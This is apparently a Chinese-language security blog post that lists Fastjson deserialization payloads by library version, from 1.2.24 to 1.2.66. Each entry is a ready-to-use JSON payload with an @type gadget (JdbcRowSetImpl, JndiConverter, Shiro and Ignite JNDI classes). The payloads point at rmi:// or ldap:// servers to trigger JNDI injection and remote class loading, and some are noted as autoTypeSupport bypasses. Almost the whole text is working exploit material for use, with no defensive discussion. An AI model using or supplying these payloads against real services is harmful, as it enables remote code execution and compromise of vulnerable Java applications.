---
title: Fastjson 多版本 payload 集合
date: 2024-04-19
tags:
  - 安全研究
  - Java
  - Fastjson
  - CVE
---

## fastjson <= 1.2.24

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1099/jndi", "autoCommit":true}
```

## fastjson <= 1.2.41

前提：autoTypeSupport 属性为 true 才能使用（fastjson >= 1.2.25 默认为 false）

```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```

## fastjson <= 1.2.42

前提：autoTypeSupport 属性为 true 才能使用

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```

## fastjson <= 1.2.43

前提：autoTypeSupport 属性为 true 才能使用

```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```

## fastjson <= 1.2.45

前提：autoTypeSupport 属性为 true 才能使用

```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1399/Exploit"}}
```

## fastjson <= 1.2.47

无需 autoTypeSupport，通用绕过：

```json
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://x.x.x.x:1999/Exploit",
        "autoCommit": true
    }
}
```

## fastjson <= 1.2.62

```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}
```

## fastjson <= 1.2.66

前提：autoTypeSupport 属性为 true 才能使用

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
```
